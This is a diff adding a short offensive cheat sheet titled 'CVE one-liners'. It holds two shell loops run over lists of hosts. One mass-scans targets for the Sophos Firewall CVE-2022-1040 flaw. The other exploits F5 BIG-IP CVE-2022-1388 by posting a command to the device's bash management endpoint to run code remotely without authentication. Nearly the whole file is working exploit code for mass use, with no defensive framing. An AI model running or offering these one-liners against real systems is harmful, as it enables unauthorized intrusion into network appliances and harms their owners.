@@ -1,0 +1,7 @@
+% CVE one-liners
+
+# Sophos Firewall CVE-2022-1040 (RCE) 
+cat sophos_servers | while read host do; do curl --connect-timeout 10 -ks -H "X-Requested-With: XMLHttpRequest" -X POST "https://$host/userportal/Controller?mode=8700&operation=1&datagrid=179&json=\{"👽":"TEST"\}" | grep -q 'Session Expired' && printf "$host \033[1;41mVulnerable a CVE-2022-1040 (Sophos RCE)\e[0m\n"; done; 
+
+# Exploit F5 Big IP  Using Curl - CVE-2022-1388  
+cat ips.txt | while read ip; do curl -su admin -H "Content-Type: application/json" http://$ip/mgmt/tm/util/bash -d '{"command":"run","utilCmdArgs":"-c id"}';done
